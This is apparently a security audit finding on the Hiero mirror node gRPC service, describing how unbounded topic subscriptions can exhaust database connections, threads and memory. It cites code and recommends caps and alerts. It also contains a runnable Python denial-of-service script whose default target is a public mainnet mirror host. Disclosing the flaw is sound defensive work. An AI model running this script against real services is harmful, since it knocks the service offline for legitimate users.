### Title
Unbounded Concurrent Subscriptions Enable Resource Exhaustion DoS in `subscribeTopic()`

### Summary
`TopicMessageServiceImpl.subscribeTopic()` increments a global `subscriberCount` metric on every new subscription but never checks it against any cap before accepting the subscription. Combined with the absence of a global inbound-connection limit and no requirement for an `endTime`, an unauthenticated attacker can open an unbounded number of infinite-lived subscriptions across many TCP connections, exhausting DB connections, Redis listener slots, heap memory, and scheduler threads until the service becomes unavailable to all users.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.java`, `subscribeTopic()`, lines 88–91:
```java
return topicExists(filter)
        .thenMany(flux.doOnNext(topicContext::onNext)
                .doOnSubscribe(s -> subscriberCount.incrementAndGet())   // line 89
                .doFinally(s -> subscriberCount.decrementAndGet())        // line 90
                .doFinally(topicContext::finished));
``` [1](#0-0) 

`subscriberCount` is declared as a plain `AtomicLong` and registered only as a Micrometer gauge — it is **never read back** to gate or reject incoming subscriptions. [2](#0-1) 

**No `endTime` required:** `TopicMessageFilter.endTime` is nullable. When `null`, `isComplete()` always returns `false` and `pastEndTime()` returns `Flux.never()`, making every such subscription infinite-lived. [3](#0-2) [4](#0-3) 

**Per-connection limit is insufficient:** The only server-side throttle is `maxConcurrentCallsPerConnection = 5`, applied in `GrpcConfiguration`: [5](#0-4) [6](#0-5) 

This limits calls **per TCP connection** but `GrpcConfiguration` sets no `maxInboundConnections`. An attacker opens N TCP connections × 5 streams each = 5N concurrent subscriptions with no server-side ceiling.

**Per-subscription resource cost:** Each accepted subscription:
1. Issues a DB query via `topicMessageRetriever.retrieve(filter, true)` (historical phase, consumes a HikariCP connection).
2. Registers a live listener via `topicListener.listen(newFilter)` (Redis subscription or polling slot).
3. Schedules a safety-check `Mono.delay` on `Schedulers.boundedElastic()` (thread pool slot).
4. Allocates a `TopicContext` object on the heap. [7](#0-6) 

### Impact Explanation
When the attacker's subscriptions exhaust the HikariCP connection pool, all legitimate DB-dependent operations (including new subscriptions and historical retrieval for real users) block or fail. Exhausting `boundedElastic` threads stalls safety-check and retrieval pipelines. Exhausting Redis listener capacity causes message delivery failures. The service effectively becomes unavailable — a complete denial of service — without any crash or exploit of memory-safety bugs. The `GrpcHighDBConnections` and `GrpcHighFileDescriptors` Prometheus alerts confirm the operators themselves consider these resources critical. [8](#0-7) 

### Likelihood Explanation
No authentication is required to call `subscribeTopic()`. The gRPC port (5600) is publicly exposed. The attacker needs only a standard gRPC client (e.g., `grpcurl`, the Hedera SDK, or a trivial Go/Java script) and the ability to open many TCP connections — achievable from a single host or a small botnet. The attack is fully repeatable and requires no special knowledge of the system internals beyond the public proto definition.

### Recommendation
1. **Enforce a global subscriber cap:** Before `subscriberCount.incrementAndGet()`, check the current value against a configurable maximum (e.g., `hiero.mirror.grpc.maxSubscribers`) and return `Mono.error(Status.RESOURCE_EXHAUSTED)` if exceeded.
2. **Limit total inbound connections:** In `GrpcConfiguration`, add `serverBuilder.maxInboundConnections(N)` alongside `maxConcurrentCallsPerConnection`.
3. **Enforce a per-IP connection limit** at the ingress/load-balancer layer (Traefik middleware already exists; add a connection rate-limit rule).
4. **Require or cap subscription duration:** Either make `endTime` mandatory or impose a server-side maximum subscription lifetime (e.g., 24 h) to bound resource hold time.
5. **Add a `GrpcHighSubscribers` alert** mirroring the existing `GrpcNoSubscribers` alert to detect anomalous growth.

### Proof of Concept
```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw grpc stubs
import grpc, threading, time

# Assume compiled proto stubs are available
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as stub
from com.hedera.mirror.api.proto import consensus_service_pb2 as pb

TARGET = "mainnet-public-mirror.hedera.com:443"  # or any exposed instance

def open_subscription(i):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    client  = stub.ConsensusServiceStub(channel)
    req = pb.ConsensusTopicQuery(
        topicID=pb.TopicID(topicNum=1234),
        # No endTime set → infinite subscription
    )
    try:
        for _ in client.subscribeTopic(req):
            pass  # drain silently; keep connection alive
    except Exception:
        pass

threads = []
for i in range(2000):          # 400 connections × 5 streams each
    t = threading.Thread(target=open_subscription, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)
    if i % 100 == 0:
        time.sleep(0.1)        # slight ramp to avoid TCP RST storms

# After ~seconds: HikariCP pool exhausted, legitimate queries time out
time.sleep(300)
```
Steps:
1. Run the script against a target instance with no ingress-level connection cap.
2. Observe `hiero_mirror_grpc_subscribers` gauge climbing without bound.
3. Observe `hikaricp_connections_active / hikaricp_connections_max → 1.0` triggering `GrpcHighDBConnections` alert.
4. Legitimate `subscribeTopic` calls from real users begin receiving `UNAVAILABLE` or hang indefinitely.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-70)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L87-91)
```java
        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L23-23)
```java
    private Long endTime;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** charts/hedera-mirror-grpc/values.yaml (L209-219)
```yaml
  GrpcHighDBConnections:
    annotations:
      description: "{{ $labels.namespace }}/{{ $labels.pod }} is using {{ $value | humanizePercentage }} of available database connections"
      summary: "Mirror gRPC API database connection utilization exceeds 75%"
    enabled: true
    expr: sum(hikaricp_connections_active{application="grpc"}) by (namespace, pod) / sum(hikaricp_connections_max{application="grpc"}) by (namespace, pod) > 0.75
    for: 5m
    labels:
      severity: critical
      application: grpc
      area: resource
```
